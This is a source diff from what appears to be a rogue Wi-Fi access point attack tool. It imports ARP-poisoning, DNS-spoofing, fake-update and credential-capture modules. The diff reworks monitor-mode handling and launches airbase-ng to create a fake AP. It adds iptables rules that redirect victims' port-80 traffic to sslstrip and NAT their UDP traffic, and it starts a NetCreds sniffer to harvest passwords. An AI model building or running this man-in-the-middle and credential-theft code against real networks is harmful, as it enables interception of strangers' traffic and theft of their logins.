@@ -31,7 +31,7 @@ from Modules.ModuleUpdateFake import frm_update_attack
 from Modules.ModuleArpPosion import frm_Arp_Poison
 from Modules.Credentials import frm_get_credentials,frm_NetCredsLogger
 from Modules.ModuleDnsSpoof import frm_DnsSpoof
-from Modules.utils import ProcessThread,Refactor,setup_logger
+from Modules.utils import ProcessThread,Refactor,setup_logger,set_monitor_mode
 from Core.Settings import frm_Settings
 from Core.update import frm_Update
 from Core.about import frmAbout
@@ -71,16 +71,17 @@ class Initialize(QMainWindow):
         self.move(frameGm.topLeft())
 
     def closeEvent(self, event):
-        m = popen('ifconfig').read()
+        m = popen('iwconfig').readlines()
         self.interface  = self.config.xmlSettings('interface', 'monitor_mode',None,False)
-        if self.interface in m:
-            reply = QMessageBox.question(self, 'About Exit','Are you sure to quit?', QMessageBox.Yes |
-                QMessageBox.No, QMessageBox.No)
-            if reply == QMessageBox.Yes:
-                event.accept()
-                call(['airmon-ng','stop',self.interface])
-            else:
-                event.ignore()
+        for i in m:
+            if search('Mode:Monitor',i):
+                reply = QMessageBox.question(self, 'About Exit','Are you sure to quit?', QMessageBox.Yes |
+                    QMessageBox.No, QMessageBox.No)
+                if reply == QMessageBox.Yes:
+                    event.accept()
+                    set_monitor_mode(self.interface).setDisable()
+                else:
+                    event.ignore()
 
 class ThRunDhcp(QThread):
     def __init__(self,args):
@@ -433,7 +434,7 @@ class SubMain(QWidget):
                 system(delete)
         except:
             pass
-        self.MonitorImport.set_monitor_mode(self.interface,False)
+        set_monitor_mode(self.interface).setDisable()
         self.Started(False)
         self.ListLoggerDhcp.clear()
 
@@ -469,7 +470,7 @@ class SubMain(QWidget):
         self.SettingsAP = {
         'interface':
             [
-                'ifconfig lo up',
+                'ifconfig %s up'%(self.Ap_iface),
                 'ifconfig %s 10.0.0.1 netmask 255.255.255.0'%(self.Ap_iface),
                 'ifconfig %s mtu 1400'%(self.Ap_iface),
                 'route add -net 10.0.0.0 netmask 255.255.255.0 gw 10.0.0.1'
@@ -486,8 +487,8 @@ class SubMain(QWidget):
                 'iptables -P FORWARD ACCEPT',
                 'iptables -t nat -A PREROUTING -p udp -j DNAT --to %s'%(self.EditGateway.text()),
                 'iptables --append FORWARD --in-interface %s -j ACCEPT'%(self.Ap_iface),
-                'iptables --table nat --append POSTROUTING --out-interface '+Refactor.get_interfaces()['activated']+' -j MASQUERADE',
-                #'iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port '+self.PortRedirect,
+                'iptables --table nat --append POSTROUTING --out-interface '+str(Refactor.get_interfaces()['activated'])+' -j MASQUERADE',
+                'iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port '+self.PortRedirect,
                 #'iptables -t -A PREROUTING -p tcp --dport 80 -j DNAT --to-destination ' +Refactor.get_interfaces()['IPaddress'],
                 'iptables -t nat -A POSTROUTING -j MASQUERADE',
                 'touch /var/run/dhcpd.pid',
@@ -513,6 +514,8 @@ class SubMain(QWidget):
                 'server=8.8.4.4\n',
             ]
         }
+        for i in self.SettingsAP['interface']:popen(i)
+        for i in self.SettingsAP['iptables']:popen(i)
         dhcp_select = self.config.xmlSettings('dhcp','dhcp_server',None,False)
         if dhcp_select != 'dnsmasq':
             with open('Settings/dhcpd.conf','w') as dhcp:
@@ -528,9 +531,6 @@ class SubMain(QWidget):
                     dhcp.write(i)
                 dhcp.close()
 
-        for i in self.SettingsAP['interface']:popen(i)
-        for i in self.SettingsAP['iptables']:popen(i)
-
     def StartApFake(self):
         self.ListLoggerDhcp.clear()
         if geteuid() != 0:
@@ -541,31 +541,29 @@ class SubMain(QWidget):
             QMessageBox.information(self,'Error',
             'Network interface not supported :(')
             return
-        if Refactor.get_interfaces()['gateway'] == None:
-            QMessageBox.information(self,'Error the connection',
-            'check your connection with internet')
-            return
 
-        if not search(self.interface,check_output('ifconfig')):
-            self.interface = self.MonitorImport.set_monitor_mode(self.selectCard.currentText(),True)
+        self.interface = str(set_monitor_mode(self.selectCard.currentText()).setEnable())
         self.config.xmlSettings('interface', 'monitor_mode',self.interface,False)
         # airbase thread
         thr_airbase = ProcessThread(['airbase-ng',
         '-c', str(self.EditChannel.text()), '-e', self.EditApName.text(),
-        '-v',  self.interface, '-F', 'Logs/'+asctime()])
+        '-F', 'Logs/'+asctime(),self.interface])
         thr_airbase.name = 'Airbase-ng'
         self.thread.append(thr_airbase)
         thr_airbase.start()
 
         # settings conf
         while True:
-            if thr_airbase.process is not None:
-                try:
-                    self.Ap_iface = [x for x in Refactor.get_interfaces()['all'] if search('at',x)][0]
-                    self.config.xmlSettings('netcreds', 'interface',self.Ap_iface,False)
-                    break
-                except:
-                    pass
+            if thr_airbase.iface != None:
+                self.Ap_iface = [x for x in Refactor.get_interfaces()['all'] if search('at',x)][0]
+                self.config.xmlSettings('netcreds', 'interface',self.Ap_iface,False)
+                break
+        # thread netcreds
+        ThNetCreds = ProcessThread(['python','Plugins/NetCreds.py','-i',
+        self.config.xmlSettings('netcreds', 'interface',None,False)])
+        ThNetCreds.setName('Net-Creds')
+        self.thread.append(ThNetCreds)
+        ThNetCreds.start()
         p = Process(target=self.CoreSettings,args=())
         p.start(),p.join()
 
@@ -585,12 +583,6 @@ class SubMain(QWidget):
             Thdhcp.start()
             self.Started(True)
 
-        # thread netcreds
-        ThNetCreds = ProcessThread(['python','Plugins/NetCreds.py','-i',
-        self.config.xmlSettings('netcreds', 'interface',None,False)])
-        ThNetCreds.setName('Net-Creds')
-        self.thread.append(ThNetCreds)
-        ThNetCreds.start()
 
         # thread sslstrip
         Thsslstrip = Threadsslstrip(self.PortRedirect)
